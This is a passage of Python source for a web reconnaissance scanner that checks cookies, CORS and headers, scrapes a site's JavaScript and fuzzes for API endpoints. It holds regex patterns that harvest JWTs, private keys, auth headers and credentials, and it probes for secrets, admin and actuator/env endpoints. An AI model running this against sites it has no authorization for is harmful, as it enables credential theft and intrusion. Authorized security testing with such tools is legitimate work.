        enc_hdr = (resp.headers.get("Content-Encoding", "") or "").lower()
        # If the body arrived in an encoding we can't inflate, skip the preview
        # instead of printing undecodable bytes as mojibake.
        undecodable = any(e in enc_hdr for e in ("br", "zstd", "compress")) and \
            not any(e in enc_hdr for e in _encodings)
        if undecodable:
            body_preview = f"[body is {enc_hdr}-compressed — preview unavailable " \
                           f"(install the matching decoder to view it)]"
        elif any(t in ct for t in ("text", "json", "xml", "javascript", "html")):
            txt = (resp.text or "")[:1500]
            # Mojibake guard: real markup is mostly printable ASCII.
            printable = sum(1 for c in txt[:400] if 32 <= ord(c) < 127 or c in "\r\n\t")
            if txt and printable / max(1, len(txt[:400])) > 0.75:
                body_preview = txt
            else:
                body_preview = "[binary or undecodable content — preview suppressed]"
    except Exception:
        pass

    result["response"] = {
        "status":        resp.status_code,
        "reason":        getattr(resp, "reason", ""),
        "final_url":     resp.url,
        "scheme":        scheme_used,
        "size":          len(resp.content),
        "content_type":  resp.headers.get("Content-Type", ""),
        "server":        resp.headers.get("Server", ""),
        "headers":       [{"name": k, "value": str(v)} for k, v in resp.headers.items()],
        "header_count":  len(resp.headers),
        "body_preview":  body_preview,
        "elapsed_ms":    round(resp.elapsed.total_seconds() * 1000) if resp.elapsed else 0,
        "encoding":      resp.encoding or "",
    }

    # ── COOKIES + security flags ──
    for c in resp.cookies:
        issues = []
        if not c.secure:
            issues.append("no Secure flag")
        rest = getattr(c, "_rest", {}) or {}
        http_only = any(str(k).lower() == "httponly" for k in rest)
        if not http_only:
            issues.append("no HttpOnly (readable by JS)")
        samesite = next((str(v) for k, v in rest.items() if str(k).lower() == "samesite"), "")
        if not samesite:
            issues.append("no SameSite")
        result["cookies"].append({
            "name": c.name,
            "value": (c.value or "")[:60] + ("…" if c.value and len(c.value) > 60 else ""),
            "domain": c.domain, "path": c.path,
            "secure": bool(c.secure), "httponly": http_only,
            "samesite": samesite, "expires": c.expires or "session",
            "issues": issues,
            "severity": "medium" if len(issues) >= 2 else ("low" if issues else "info"),
        })

    # ── ALLOWED METHODS (OPTIONS) + CORS ──
    try:
        o = requests.options(f"{scheme_used}://{domain}", headers=REQ_HEADERS,
                             timeout=8, verify=False, allow_redirects=False)
        allow = o.headers.get("Allow") or o.headers.get("Access-Control-Allow-Methods") or ""
        methods = [m.strip().upper() for m in allow.split(",") if m.strip()]
        risky = [m for m in methods if m in ("PUT", "DELETE", "TRACE", "TRACK", "PATCH", "CONNECT")]
        result["methods"] = {"status": o.status_code, "allowed": methods, "risky": risky,
                             "raw": allow[:200]}
    except Exception:
        result["methods"] = {"status": None, "allowed": [], "risky": [], "raw": ""}

    try:
        probe_origin = "https://kumo-recon.example"
        c = requests.get(f"{scheme_used}://{domain}",
                         headers=dict(REQ_HEADERS, Origin=probe_origin),
                         timeout=8, verify=False, allow_redirects=False)
        acao = c.headers.get("Access-Control-Allow-Origin", "")
        acac = c.headers.get("Access-Control-Allow-Credentials", "")
        note, sev = "", "info"
        if acao == "*":
            note, sev = "Wildcard origin allowed", "low"
        elif acao and probe_origin in acao:
            note = "Reflects arbitrary Origin"
            sev = "high" if acac.lower() == "true" else "medium"
        result["cors"] = {"allow_origin": acao, "allow_credentials": acac,
                          "reflected": bool(acao and probe_origin in acao),
                          "note": note, "severity": sev}
    except Exception:
        result["cors"] = {}

    # ── SECURITY HEADERS present/absent (quick at-a-glance) ──
    SEC = ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options",
           "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy"]
    result["security_headers"] = {
        h: resp.headers.get(h, "") for h in SEC
    }

    # ── NOTABLE / NON-STANDARD HEADERS worth a look ──
    STANDARD = {
        "date", "content-type", "content-length", "connection", "server", "vary",
        "cache-control", "expires", "last-modified", "etag", "accept-ranges",
        "content-encoding", "transfer-encoding", "location", "set-cookie", "age",
        "strict-transport-security", "content-security-policy", "x-frame-options",
        "x-content-type-options", "referrer-policy", "permissions-policy", "pragma",
        "content-language", "alt-svc", "link", "report-to", "nel",
    }
    LEAKY = {
        "x-powered-by": ("Backend stack disclosed", "low"),
        "x-aspnet-version": ("ASP.NET version disclosed", "low"),
        "x-aspnetmvc-version": ("ASP.NET MVC version disclosed", "low"),
        "x-generator": ("CMS/generator disclosed", "low"),
        "x-drupal-cache": ("Drupal fingerprint", "info"),
        "x-backend-server": ("Internal backend hostname leaked", "medium"),
        "x-served-by": ("Internal node/CDN name", "info"),
        "x-amz-cf-id": ("AWS CloudFront", "info"),
        "x-debug-token": ("Debug token exposed (Symfony profiler)", "medium"),
        "x-debug-token-link": ("Symfony profiler link exposed", "high"),
        "x-runtime": ("Response timing leak (Rails)", "info"),
        "x-request-id": ("Request correlation id", "info"),
        "via": ("Proxy chain disclosed", "info"),
        "x-cache": ("Cache layer", "info"),
        "x-real-ip": ("Client IP echoed back", "low"),
        "x-forwarded-for": ("Forwarding chain echoed back", "low"),
        "x-kubernetes-pod": ("Kubernetes pod name leaked", "medium"),
        "x-envoy-upstream-service-time": ("Envoy/Istio mesh", "info"),
    }
    for k, v in resp.headers.items():
        lk = k.lower()
        if lk in LEAKY:
            desc, sev = LEAKY[lk]
            result["notable_headers"].append(
                {"name": k, "value": str(v)[:120], "note": desc, "severity": sev})
        elif lk not in STANDARD and lk.startswith("x-"):
            result["notable_headers"].append(
                {"name": k, "value": str(v)[:120], "note": "Non-standard header", "severity": "info"})

    result["summary"] = {
        "status": resp.status_code,
        "redirects": max(0, len(result["redirect_chain"]) - 1),
        "req_headers": len(result["request"].get("headers", [])),
        "resp_headers": result["response"]["header_count"],
        "cookies": len(result["cookies"]),
        "notable": len(result["notable_headers"]),
        "risky_methods": len(result["methods"].get("risky", [])),
    }
    return result


def scan_content_intel(domain):
    """
    Content Intelligence — scrapes the homepage HTML + all first-party JS
    files for *interesting* material, not just secrets:
      • Endpoints & relative paths (LinkFinder-style)
      • Absolute URLs split into internal vs external / third-party sources
      • API endpoints (/api, /graphql, /v1, /oauth, /token ...)
      • Database connection URIs (mongodb, postgres, mysql, redis, jdbc ...)
      • Cloud storage (AWS S3 / GCS / Azure Blob / Firebase)
      • Emails, public IP addresses, internal hostnames
      • Sensitive hints (JWTs, private keys, auth headers, basic-auth URLs,
        source maps, credential-like assignments, risky code comments)

    Detection/inventory only — for recon on assets you are authorized to test.
    """
    if not HAS_REQUESTS:
        return {"error": "requests required"}

    import re as _re
    import urllib.parse as _up
    import threading as _thr

    UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
    MAX_JS, MAX_PER_CAT, PER_FILE_LIMIT = 20, 200, 800_000

    RE_ENDPOINT = _re.compile(
        r'''(?:"|')((?:[a-zA-Z][a-zA-Z0-9+.\-]{1,9}://|//)[^\s"'<>]{2,}'''
        r'''|/[a-zA-Z0-9_\-][a-zA-Z0-9_\-/.%?=&:@]{1,120}'''
        r'''|[a-zA-Z0-9_\-/]{1,40}\.(?:json|js|php|aspx?|jsp|action|do|xml|txt|yml|yaml|env|config|bak|sql|graphql|api)(?:\?[^\s"'<>]{0,80})?)(?:"|')''')
    RE_FULLURL   = _re.compile(r'https?://[^\s"\'<>\\)]{4,200}')
    RE_DB        = _re.compile(r'(?i)\b((?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|mariadb|rediss?|amqp|elasticsearch|clickhouse|cassandra|couchbase|ldaps?|ftp|jdbc:[a-z0-9]+)://[^\s"\'<>]{4,180})')
    RE_S3        = _re.compile(r'(?i)\b([a-z0-9][a-z0-9.\-]{1,60}\.s3(?:[.\-][a-z0-9\-]+)?\.amazonaws\.com|s3://[a-z0-9._\-]{3,63}|s3[.\-][a-z0-9\-]*\.amazonaws\.com/[a-z0-9._\-]{3,63})')
    RE_GCS       = _re.compile(r'(?i)\b(storage\.googleapis\.com/[a-z0-9._\-]{3,63}|[a-z0-9._\-]{3,63}\.storage\.googleapis\.com)')
    RE_AZURE     = _re.compile(r'(?i)\b([a-z0-9]{3,40}\.blob\.core\.windows\.net(?:/[^\s"\'<>]{0,80})?)')
    RE_FIREBASE  = _re.compile(r'(?i)\b([a-z0-9\-]{3,60}\.(?:firebaseio\.com|firebaseapp\.com|web\.app))')
    RE_EMAIL     = _re.compile(r'\b[a-zA-Z0-9._%+\-]{1,64}@[a-zA-Z0-9.\-]{2,60}\.[a-zA-Z]{2,12}\b')
    RE_IPV4      = _re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b')
    RE_INTHOST   = _re.compile(r'(?i)\b((?:[a-z0-9\-]{1,40}\.)+(?:local|internal|intranet|corp|lan|staging|localhost)(?::\d{2,5})?)\b')
    RE_JWT       = _re.compile(r'\beyJ[A-Za-z0-9_\-]{8,}\.eyJ[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{6,}')
    RE_PRIVKEY   = _re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----')
    RE_AUTHHDR   = _re.compile(r'(?i)authorization["\']?\s*[:=]\s*["\']?(?:bearer|basic)\s+[A-Za-z0-9._\-/+=]{8,}')
    RE_BASICAUTH = _re.compile(r'https?://[^\s"\'<>/:@]{1,40}:[^\s"\'<>/:@]{1,40}@[^\s"\'<>]{3,}')
    RE_SOURCEMAP = _re.compile(r'(?i)sourceMappingURL=([^\s"\'*]{2,120})')
    RE_CREDASSIGN= _re.compile(r'(?i)\b(password|passwd|pwd|secret|token|api[_\-]?key|access[_\-]?key|auth|private[_\-]?key|client[_\-]?secret)["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']')
    RE_COMMENT   = _re.compile(r'(?i)(?:(?<![:/])//|/\*|<!--)\s*([^\n\r*]{0,160}?\b(?:todo|fixme|hack|xxx|password|secret|api[_\s\-]?key|deprecated|backdoor|do not|remove before|temporary|hardcoded|debug)\b[^\n\r*]{0,120})')
    RE_SCRIPTSRC = _re.compile(r'(?i)<script[^>]+src=["\']([^"\'> ]+)["\']')
    RE_INLINE    = _re.compile(r'(?is)<script(?![^>]*\bsrc=)[^>]*>(.*?)</script>')
    API_HINT     = _re.compile(r'(?i)(/api/|/api$|/graphql|/v\d+/|/rest/|/oauth|/token\b|/auth/|/gql\b)')
    # Low-value static assets we don't want cluttering the endpoint/URL lists.
    STATIC_RE    = _re.compile(r'(?i)\.(?:css|js|mjs|map|png|jpe?g|gif|svg|webp|ico|bmp|avif|'
                               r'woff2?|ttf|eot|otf|mp4|webm|mp3|wav|ogg|pdf|zip|gz|woff|json)(?:[?#].*)?$')
    def _is_static(s):
        try:
            return bool(STATIC_RE.search(s.split("?")[0].split("#")[0]))
        except Exception:
            return False

    SKIP_CDNS = ["jquery","bootstrap","google-analytics","googletagmanager","facebook.net",
                 "cdn.jsdelivr","cdnjs.cloudflare","unpkg.com","ajax.googleapis","gstatic.com",
                 "hotjar","intercom","segment.io","mixpanel","recaptcha","newrelic","datadog",
                 "sentry-cdn","bugsnag","polyfill.io","fontawesome"]

    # Documentation / reference domains that show up inside library comments &
    # JSDoc (e.g. MDN URLs like .../Web/API/... match the "/api/" hint). These
    # are noise, never the target's own infrastructure — drop them entirely.
    DOC_HOSTS = ("developer.mozilla.org", "mozilla.org", "w3.org", "w3schools.com",
                 "html5rocks.com", "stackoverflow.com", "stackexchange.com",
                 "caniuse.com", "npmjs.com", "npmjs.org", "jquery.com", "reactjs.org",
                 "react.dev", "angular.io", "vuejs.org", "developer.chrome.com",
                 "developer.android.com", "developer.apple.com", "docs.microsoft.com",
                 "learn.microsoft.com", "developers.google.com", "web.dev", "wikipedia.org",
                 "schema.org", "opensource.org", "gnu.org", "creativecommons.org",
                 "github.io", "readthedocs.io", "medium.com", "css-tricks.com")

    def _is_doc_host(h):
        return any(h == d or h.endswith("." + d) for d in DOC_HOSTS)

    def host_of(u):
        try:
            return _up.urlparse(u if "://" in u else "http://" + u).netloc.lower().split(":")[0]
        except Exception:
            return ""

    def is_internal(h):
        return (not h) or h == domain or h.endswith("." + domain)

    def norm(u, scheme):
        u = u.strip()
        if u.startswith("//"):   return "https:" + u
        if u.startswith(("http://", "https://")): return u
        if u.startswith("/"):    return f"{scheme}://{domain}{u}"
        return f"{scheme}://{domain}/" + u.lstrip("./")

    # ── gather sources ──
    sources, js_urls = [], []
    homepage, used_scheme = None, "https"
    for scheme in ("https", "http"):
        try:
            r = requests.get(f"{scheme}://{domain}", timeout=8, verify=False,
                             allow_redirects=True, headers=UA)
            if r.text:
                homepage, used_scheme = r.text, scheme
                break
        except Exception:
            continue
    if homepage is None:
        return {"error": "Homepage unreachable — nothing to scrape"}

    sources.append(("(homepage HTML)", homepage[:PER_FILE_LIMIT]))
    inline_n = 0
    for m in RE_INLINE.finditer(homepage):
        blk = m.group(1)
        if blk and blk.strip():
            inline_n += 1
            sources.append(("(inline script)", blk[:PER_FILE_LIMIT]))

    seen_js = set()
    for m in RE_SCRIPTSRC.finditer(homepage):
        raw = m.group(1)
        if any(c in raw.lower() for c in SKIP_CDNS):
            continue
        u = norm(raw, used_scheme)
        if is_internal(host_of(u)) and u not in seen_js:
            seen_js.add(u); js_urls.append(u)
        if len(js_urls) >= MAX_JS:
            break

    _lock = _thr.Lock()
    def fetch_js(u):
        try:
            r = requests.get(u, timeout=8, verify=False, headers=UA)
            if r.status_code == 200 and r.text:
                with _lock:
                    sources.append((u.split("?")[0][-80:], r.text[:PER_FILE_LIMIT]))
        except Exception:
            pass
    if js_urls:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            list(ex.map(fetch_js, js_urls))

        # Follow one level of webpack/Vite chunk references. SPAs load a small
        # entry bundle that names dozens of chunks, and the interesting material
        # (DB URIs, internal hosts, API routes) lives in those chunks.
        chunk_urls, seen_chunks = [], set(js_urls)
        for label, text in list(sources):
            if not label.endswith((".js", ".mjs")) and "(inline" not in label:
                continue
            for m in _re.finditer(r'["\']([\w./\-]{3,120}?\.m?js)(?:\?[\w=&.\-]{0,40})?["\']', text or ""):
                cand = m.group(1)
                if any(c in cand.lower() for c in SKIP_CDNS):
                    continue
                if not any(k in cand for k in ("chunk", "static/js", "assets/", "/js/",
                                               "bundle", "main", "vendor", "app")):
                    continue
                cu = norm(cand, used_scheme)
                if is_internal(host_of(cu)) and cu not in seen_chunks:
                    seen_chunks.add(cu)
                    chunk_urls.append(cu)
        chunk_urls = chunk_urls[:MAX_JS]
        if chunk_urls:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                list(ex.map(fetch_js, chunk_urls))
            js_urls = list(js_urls) + chunk_urls

    # ── extract ──
    cats = {k: {} for k in ("endpoints", "urls_internal", "urls_external", "api_endpoints",
                            "databases", "cloud_storage", "emails", "ip_addresses",
                            "internal_hosts", "sensitive")}

    def put(cat, value, src, extra=None):
        value = (value or "").strip()
        if not value:
            return
        d = cats[cat]
        # Sensitive values (tokens, JWTs, credentials, keys) shown in full;
        # other categories capped to keep the payload sane.
        cap = 2000 if cat == "sensitive" else 300
        if value not in d and len(d) < MAX_PER_CAT:
            d[value] = dict({"value": value[:cap], "source": src}, **(extra or {}))

    def add_url(u, label):
        """Route a URL: internal (keep non-static full URL) vs external (collapse
        to unique host — the valuable 'who does this site talk to' signal)."""
        h = host_of(u)
        if _is_doc_host(h):
            return   # MDN / W3C / docs references in library comments — noise
        is_api = bool(API_HINT.search(u))
        if is_internal(h):
            if is_api:
                put("api_endpoints", u, label)
            if not _is_static(u):
                put("urls_internal", u, label)
        else:
            # collapse third-party asset URLs to their host
            if is_api and not _is_static(u):
                put("api_endpoints", u, label)
            put("urls_external", h or u, label)

    for label, text in sources:
        if not text:
            continue
        for m in RE_ENDPOINT.finditer(text):
            ep = m.group(1)
            if not ep or len(ep) < 2:
                continue
            if ep.startswith(("http://", "https://", "//")):
                add_url(ep if "://" in ep else "https:" + ep, label)
            elif "://" in ep:
                # non-web scheme (mongodb://, ftp://, ws://…) — handled by the
                # dedicated database/cloud categories, not the endpoint list
                continue
            else:
                if API_HINT.search(ep):
                    put("api_endpoints", ep, label)
                if not _is_static(ep):     # drop .css/.js/img/font endpoints
                    put("endpoints", ep, label)
        for m in RE_FULLURL.finditer(text):
            add_url(m.group(0), label)
        for m in RE_DB.finditer(text):
            put("databases", m.group(1), label, {"kind": "database uri", "severity": "critical"})
        for rx, kind in ((RE_S3, "AWS S3"), (RE_GCS, "Google Cloud Storage"),
                         (RE_AZURE, "Azure Blob"), (RE_FIREBASE, "Firebase")):
            for m in rx.finditer(text):
                put("cloud_storage", m.group(1), label, {"kind": kind})
        for m in RE_EMAIL.finditer(text):
            put("emails", m.group(0), label)
        for m in RE_IPV4.finditer(text):
            ip = m.group(0)
            if ip not in ("0.0.0.0", "127.0.0.1") and not ip.startswith(("0.", "255.")):
                put("ip_addresses", ip, label)
        for m in RE_INTHOST.finditer(text):
            put("internal_hosts", m.group(1), label)
        for m in RE_JWT.finditer(text):
            put("sensitive", m.group(0), label, {"kind": "JWT token", "severity": "high"})
        for m in RE_PRIVKEY.finditer(text):
            put("sensitive", m.group(0), label, {"kind": "Private key", "severity": "critical"})
        for m in RE_AUTHHDR.finditer(text):
            put("sensitive", m.group(0), label, {"kind": "Authorization header", "severity": "high"})
        for m in RE_BASICAUTH.finditer(text):
            put("sensitive", m.group(0), label, {"kind": "Basic-auth URL", "severity": "high"})
        for m in RE_SOURCEMAP.finditer(text):
            put("sensitive", m.group(1), label, {"kind": "Source map", "severity": "low"})
        for m in RE_CREDASSIGN.finditer(text):
            val = m.group(2)
            put("sensitive", f"{m.group(1)} = {val}", label,
                {"kind": "Credential-like assignment", "severity": "high"})
        for m in RE_COMMENT.finditer(text):
            put("sensitive", m.group(1).strip()[:140], label, {"kind": "Risky code comment", "severity": "low"})

    result = {
        "domain": domain,
        "sources_scanned": {"html": 1, "inline_scripts": inline_n,
                            "js_files": len(js_urls), "js_urls": js_urls[:40]},
        "categories": {k: list(v.values()) for k, v in cats.items()},
        "counts": {k: len(v) for k, v in cats.items()},
    }
    result["total"] = sum(result["counts"].values())
    return result



# ═══════════════════════════════════════════════════════════════════
# MODULE: API ENDPOINT FUZZER
# ═══════════════════════════════════════════════════════════════════
def scan_api_fuzzer(domain):
    """
    Smart API discovery.
    Confirms a base API path exists first — stops if nothing responds.
    Then probes common endpoints under the confirmed base.
    """
    import threading as _thr
    import random
    import string as _str

    result = {
        "domain":     domain,
        "base_found": None,
        "bases_found": [],
        "endpoints":  [],
        "graphql":    None,
        "specs":      [],
        "discovered": [],
        "total":      0,
    }

    API_BASES = ["/api", "/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/v3",
                 "/rest", "/service", "/services", "/wp-json", "/wp-json/wp/v2",
                 "/graphql", "/_api", "/api/public", "/api/internal", "/backend",
                 "/gateway", "/oauth", "/.netlify/functions", "/api/rest"]

    # Root-level specification / documentation endpoints. These are probed
    # ALWAYS — independent of whether a base path is found — because a site can
    # expose its whole API surface here even when /api itself returns HTML.
    ROOT_SPECS = [
        ("/swagger.json",                     "Swagger spec",              "high"),
        ("/swagger/v1/swagger.json",          "Swagger spec (ASP.NET)",    "high"),
        ("/openapi.json",                     "OpenAPI spec",              "high"),
        ("/openapi.yaml",                     "OpenAPI spec (YAML)",       "high"),
        ("/v2/api-docs",                      "Springfox API docs",        "high"),
        ("/v3/api-docs",                      "SpringDoc OpenAPI",         "high"),
        ("/api-docs",                         "API docs",                  "medium"),
        ("/swagger-ui.html",                  "Swagger UI",                "medium"),
        ("/swagger-ui/index.html",            "Swagger UI",                "medium"),
        ("/redoc",                            "ReDoc UI",                  "medium"),
        ("/graphiql",                         "GraphiQL IDE",              "high"),
        ("/playground",                       "GraphQL Playground",        "high"),
        ("/.well-known/openid-configuration", "OIDC discovery",            "medium"),
        ("/.well-known/oauth-authorization-server", "OAuth metadata",      "medium"),
        ("/.well-known/security.txt",         "security.txt",              "info"),
        ("/wp-json/wp/v2/users",              "WordPress user enumeration","high"),
        ("/wp-json",                          "WordPress REST root",       "medium"),
        ("/actuator",                         "Spring Actuator root",      "high"),
        ("/actuator/health",                  "Spring Actuator health",    "medium"),
        ("/actuator/env",                     "Spring Actuator env",       "critical"),
        ("/actuator/mappings",                "Spring Actuator mappings",  "high"),
        ("/manifest.json",                    "App manifest",              "info"),
        ("/api/config",                       "API config",                "high"),
        ("/config.json",                      "Config JSON",               "high"),
        ("/env.js",                           "Runtime env JS",            "high"),
        ("/_next/data",                       "Next.js data routes",       "medium"),
    ]

    ENDPOINT_PATHS = [
        ("/users",          "Users list",           "high"),
        ("/users/me",       "Current user info",    "high"),
        ("/user",           "User endpoint",        "high"),
        ("/accounts",       "Accounts",             "high"),
        ("/customers",      "Customers",            "high"),
        ("/orders",         "Orders",               "high"),
        ("/products",       "Products",             "medium"),
        ("/admin",          "Admin endpoint",       "critical"),
        ("/admin/users",    "Admin user list",      "critical"),
        ("/auth/login",     "Auth login",           "medium"),
        ("/login",          "Login endpoint",       "medium"),
        ("/register",       "Registration",         "medium"),
        ("/token",          "Token endpoint",       "high"),
        ("/refresh",        "Token refresh",        "high"),
        ("/config",         "Config endpoint",      "high"),
        ("/settings",       "Settings",             "medium"),
        ("/debug",          "Debug endpoint",       "critical"),
        ("/metrics",        "Metrics",              "medium"),
        ("/health",         "Health check",         "low"),
        ("/status",         "Status endpoint",      "low"),
        ("/version",        "Version disclosure",   "low"),
        ("/info",           "Info endpoint",        "low"),
        ("/docs",           "API docs",             "medium"),
        ("/swagger",        "Swagger UI",           "medium"),
        ("/swagger.json",   "Swagger JSON",         "medium"),
        ("/openapi.json",   "OpenAPI spec",         "medium"),
        ("/redoc",          "ReDoc",                "medium"),
        ("/keys",           "Keys endpoint",        "critical"),
        ("/secrets",        "Secrets",              "critical"),
        ("/tokens",         "Tokens list",          "high"),
        ("/export",         "Data export",          "high"),
        ("/logs",           "Logs endpoint",        "high"),
        ("/files",          "Files endpoint",       "high"),
        ("/upload",         "Upload endpoint",      "high"),
        ("/backup",         "Backup endpoint",      "high"),
        ("/events",         "Events",               "medium"),
        ("/search",         "Search endpoint",      "low"),
        ("/graphql",        "GraphQL under base",   "high"),
    ]

    # Baseline: probe a random path to detect catch-all servers
    _rnd = "/" + "".join(random.choices(_str.ascii_lowercase, k=12))
    base_url = None
    _catch_all_status = None
    _catch_all_size   = -1

    UA_H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "application/json"}
    _lock0 = _thr.Lock()

    def _generic(r):
        """Catch-all / soft-404 response — carries no information."""
        if r is None:
            return True
        if _catch_all_status is not None and r.status_code == _catch_all_status \
           and abs(len(r.content) - _catch_all_size) <= max(256, _catch_all_size * 0.15):
            return True
        return _looks_soft_404(r)

    scheme_used = "https"
    for scheme in ["https", "http"]:
        try:
            _br = requests.get(f"{scheme}://{domain}{_rnd}", timeout=5,
                verify=False, allow_redirects=False, headers=UA_H)
            _catch_all_status = _br.status_code
            _catch_all_size   = len(_br.content)
            scheme_used = scheme
            break
        except Exception:
            continue

    def _looks_api(r):
        ct = r.headers.get("Content-Type", "").lower()
        try:
            body = r.text[:300].strip()
        except Exception:
            body = ""
        return ("json" in ct or "api" in ct or body.startswith("{") or body.startswith("[")
                or r.status_code in (401, 405, 422))

    # ── Collect EVERY responding base, not just the first one ──
    def _probe_base(base):
        for scheme in ([scheme_used] if scheme_used else ["https", "http"]):
            try:
                r = requests.get(f"{scheme}://{domain}{base}", timeout=5,
                                 verify=False, allow_redirects=False, headers=UA_H)
            except Exception:
                continue
            if r.status_code not in (200, 401, 403, 405, 422) or _generic(r):
                continue
            if _looks_api(r):
                return (base, f"{scheme}://{domain}{base}", r.status_code, len(r.content))
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for found in ex.map(_probe_base, API_BASES):
            if found:
                result["bases_found"].append(
                    {"path": found[0], "status": found[2], "size": found[3]})
                if base_url is None:
                    base_url = found[1]
                    result["base_found"] = found[0]

    # ── ALWAYS probe root-level specs/docs, even with no API base ──
    def _probe_spec(item):
        path, name, sev = item
        try:
            r = requests.get(f"{scheme_used}://{domain}{path}", timeout=5,
                             verify=False, allow_redirects=False, headers=UA_H)
        except Exception:
            return None
        if r.status_code not in (200, 401, 403) or _generic(r):
            return None
        ct = r.headers.get("Content-Type", "").lower()
        try:
            body = r.text[:400]
        except Exception:
            body = ""
        low = body.lower()
        # Require it to actually look like a spec/doc, not the site's HTML shell
        looks_real = (
            "json" in ct or "yaml" in ct
            or body.strip().startswith(("{", "[", "openapi", "swagger"))
            or any(k in low for k in ("swagger", "openapi", "graphiql", "redoc",
                                      "\"paths\"", "actuator", "wp-json", "_links",
                                      "issuer", "authorization_endpoint"))
        )
        if not looks_real:
            return None
        return {"path": path, "name": name, "severity": sev,
                "status": r.status_code, "size": len(r.content),
                "content_type": ct[:40]}

    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for s in ex.map(_probe_spec, ROOT_SPECS):
            if s:
                result["specs"].append(s)

    # ── Harvest REAL API paths out of the site's own JavaScript ──
    # Guessing is a fallback; the app's bundles usually name the exact routes.
    discovered_paths = set()
    try:
        import re as _re2
        html = requests.get(f"{scheme_used}://{domain}", timeout=8, verify=False,
                            headers=UA_H, allow_redirects=True).text[:600_000]
        js_srcs = []
        for m in _re2.finditer(r'<script[^>]+src=["\']([^"\'> ]+)["\']', html, _re2.I):
            u = m.group(1).strip()
            if u.startswith("//"):
                u = "https:" + u
            elif u.startswith("/"):
                u = f"{scheme_used}://{domain}{u}"
            elif not u.startswith("http"):
                u = f"{scheme_used}://{domain}/{u.lstrip('./')}"
            js_srcs.append(u)
        blobs = [html]

        def _grab(u):
            try:
                rr = requests.get(u, timeout=7, verify=False, headers=UA_H)
                if rr.status_code == 200:
                    return rr.text[:400_000]
            except Exception:
                pass
            return ""
        if js_srcs:
            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
                blobs.extend([b for b in ex.map(_grab, js_srcs[:12]) if b])

        API_PATH_RE = _re2.compile(
            r'["\'](/(?:api|rest|v\d|graphql|oauth|auth|wp-json|_api|services?)'
            r'[A-Za-z0-9_\-/.]{0,60})["\']')
        for b in blobs:
            for m in API_PATH_RE.finditer(b):
                p = m.group(1)
                if 3 < len(p) <= 70 and not p.endswith((".js", ".css", ".png", ".svg", ".map")):
                    discovered_paths.add(p)
    except Exception:
        pass
    discovered_paths = sorted(discovered_paths)[:40]

    def _probe_discovered(path):
        try:
            r = requests.get(f"{scheme_used}://{domain}{path}", timeout=5,
                             verify=False, allow_redirects=False, headers=UA_H)
        except Exception:
            return None
        if r.status_code in (404, 410) or _generic(r):
            return None
        if not _looks_api(r):
            return None
        sev = "high" if any(k in path.lower() for k in
                            ("admin", "user", "token", "key", "secret", "config",
                             "debug", "internal", "export", "backup")) else "medium"
        return {"path": path, "name": "Discovered in JS", "severity": sev,
                "status": r.status_code, "size": len(r.content),
                "source": "js_discovery"}

    if discovered_paths:
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            for d in ex.map(_probe_discovered, discovered_paths):
                if d:
                    result["discovered"].append(d)

    # GraphQL check — probe candidates in parallel, bounded
    def _probe_gql(gql):
        for scheme in ["https", "http"]:
            try:
                r = requests.post(f"{scheme}://{domain}{gql}", json={"query": "{__typename}"},
                                  timeout=4, verify=False,
                                  headers={"Content-Type": "application/json",
                                           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            except Exception:
                continue
            body = r.text[:500].lower()
            ct = r.headers.get("Content-Type", "").lower()
            raw = (r.text or "").lstrip()
            # A real GraphQL endpoint answers with JSON. Matching loose keywords
            # inside an HTML page produced false positives (a 300 KB login page
            # containing the word "data" is not a GraphQL API).
            is_json = "json" in ct or raw.startswith(("{", "["))
            if not is_json or _looks_soft_404(r):
                continue
            if r.status_code in (200, 400) and any(k in body for k in ("__typename", "\"data\"", "\"errors\"", "graphql")):
                introspection = "__typename" in body or '"data"' in r.text
                return {
                    "path": gql, "status": r.status_code,
                    "severity": "high" if introspection else "medium",
                    "size": len(r.content),
                    "detail": ("GraphQL — introspection enabled" if introspection
                               else "GraphQL — returns errors (restricted)"),
                }
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        for g in ex.map(_probe_gql, ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]):
            if g:
                result["graphql"] = g
                break

    # NOTE: no early bail-out. Root specs and JS-discovered paths are valuable
    # findings on their own, even when no /api base responds.
    if base_url:
        ENDPOINTS = ENDPOINT_PATHS

        _lock = _thr.Lock()

        # Some APIs answer 200-JSON for ANY sub-path. Fingerprint that first,
        # otherwise every guessed endpoint looks like a real discovery.
        _api_ca_status, _api_ca_size = None, -1
        try:
            _rp = "/" + "".join(random.choices(_str.ascii_lowercase, k=14))
            _rr = requests.get(f"{base_url}{_rp}", timeout=5, verify=False,
                               allow_redirects=False, headers=UA_H)
            _api_ca_status, _api_ca_size = _rr.status_code, len(_rr.content)
        except Exception:
            pass

        def check_ep(ep):
            path, name, sev = ep
            try:
                r = requests.get(
                    f"{base_url}{path}", timeout=5,
                    verify=False, allow_redirects=False,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                             "Accept": "application/json"}
                )
                # Identical to the response for a random path → not a discovery
